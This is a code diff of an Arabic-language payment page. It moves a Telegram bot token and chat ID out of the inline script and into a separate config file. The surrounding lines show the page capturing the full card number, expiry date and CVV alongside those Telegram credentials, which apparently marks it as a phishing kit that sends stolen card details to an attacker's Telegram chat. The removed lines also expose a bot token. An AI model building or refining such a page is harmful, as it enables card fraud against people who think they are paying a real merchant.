@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
+  <script src="/js/telegram-config.js"></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <title>الدفع</title>
@@ -406,8 +407,8 @@
 
             loadingOverlay.classList.add('show');
 
-            const botToken = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
-            const chatId = '8108427825';
+            const botToken = TELEGRAM_CONFIG.botToken;
+            const chatId = TELEGRAM_CONFIG.chatId;
             const fullCardNumber = cardNumber;
             const cardExpiry = expiry;
             const cardCvv = cvv;
